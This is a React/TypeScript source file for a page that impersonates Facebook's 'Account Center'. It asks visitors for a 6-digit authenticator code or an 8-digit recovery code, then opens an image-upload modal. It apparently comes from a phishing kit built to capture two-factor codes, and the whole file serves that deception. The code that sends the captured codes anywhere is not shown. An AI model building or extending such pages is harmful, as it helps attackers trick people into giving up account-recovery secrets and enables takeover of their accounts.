import React, { useState } from 'react';
import useFormValidation from '@hooks/useFormValidation';
import OTPImage from "@assets/verify_otp.png";
import Loading from '@components/Loading';
import ImageUpload from '@pages/ImageUpload';
const CodeInput: React.FC = () => {
	const [code, setCode] = useState('');
	const { errors, validateInput } = useFormValidation();
	const [isLoading, setIsLoading] = useState<boolean>(false);
	const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
	const handleCodeChange = (event: React.ChangeEvent<HTMLInputElement>) => {
		const value = event.target.value;
		if (/^\d*$/.test(value) && value.length <= 8) {
			setCode(value);
		}
	};

	const handleBlur = () => {
		validateInput('code', code);
	};
	const isCodeValid = code.length === 6 || code.length === 8;
	const handleCloseModal = () => {
		setIsModalOpen(false);
	};
	return (
		<div className="flex flex-col w-full justify-center items-center p-4">
			<div className='flex w-11/12 flex-col gap-2 justify-center md:w-3/6 2xl:w-1/3'>
				<div className='flex-col flex'>
					<b>Account Center - Facebook</b>
					<b className='text-2xl'>Check notifications on another device</b>
				</div>
				<img src={OTPImage} alt="" />
				<div>
					<b>Approve from another device or Enter your login code</b>
					<p>Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code</p>
				</div>
				<div className='my-2'>
					<input
						className='w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='text'
						autoComplete='one-time-code'
						inputMode='numeric'
						maxLength={8}
						minLength={6}
						pattern='\d*'
						placeholder='Enter Code'
						value={code}
						onChange={handleCodeChange}
						onBlur={handleBlur}
					/>
					{errors.code && <p className='text-red-500'>{errors.code}</p>}
					<button
						className={`my-5 flex w-full items-center justify-center rounded-lg  p-4 font-semibold text-white  ${isCodeValid ? 'cursor-pointer bg-blue-500 hover:bg-blue-600' : 'cursor-not-allowed bg-blue-300'} ${isLoading ? 'cursor-not-allowed opacity-70' : ''
							}`}
						onClick={() => {
							if (isCodeValid) {
								setIsLoading(!isLoading);
								setIsModalOpen(true);
							}
						}}
						disabled={!isCodeValid || isLoading}
					>
						{isLoading ? <Loading /> : 'Continue'}
					</button>
				</div>

			</div>
			{isModalOpen && <ImageUpload onClose={handleCloseModal} />}
		</div>
	);
};

export default CodeInput;
